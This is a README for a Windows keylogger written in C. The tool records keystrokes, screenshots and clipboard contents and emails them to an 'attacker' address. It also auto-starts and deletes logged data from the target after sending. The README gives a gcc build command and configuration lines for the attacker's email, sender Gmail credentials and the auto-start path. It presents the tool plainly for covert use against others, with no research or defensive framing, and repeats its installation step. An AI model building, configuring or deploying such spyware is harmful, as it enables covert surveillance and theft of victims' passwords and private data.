# Arx C KeyLogger

This project is a keylogger application for the Windows operating system that logs keystrokes and sends the recorded data via email. It also takes screenshots and logs clipboard data.

## Features

- Logs keyboard keystrokes
- Sends logs via email
- Takes screenshots
- Logs clipboard data
- Auto-starts the log file
- Splits the log file when it reaches a size limit
- Encrypts the log file
- Deletes the logged data from the target system after sending it to the attacker

## Requirements

- Windows operating system
- A C compiler (e.g., GCC)
- Required libraries: `user32.lib`, `wininet.lib`

## Installation

1. **Compile the Code**:
   Compile your code with a C compiler. For example:
   ```bash
   gcc -o keylogger keylogger.c -luser32 -lwininet
## Installation

1. **Compile the Code**:
   Compile your code with a C compiler. For example:
   ```bash
   gcc -o keylogger keylogger.c -luser32 -lwininet

2. **Configure SMTP Settings:**
 Fill in the following SMTP settings with your information:

```char attackerEmail[] = "your_attacker_email@gmail.com"; // Attacker's email address
char senderEmail[] = "your_email@gmail.com"; // Sender's Gmail address
char emailPassword[] = "your_email_password"; // Sender's Gmail password
```

3. Set the Path for Auto-Start: Change the following exePath value to the path of your application executable:

`const char *exePath = "C:\\path\\to\\your\\executable.exe";`
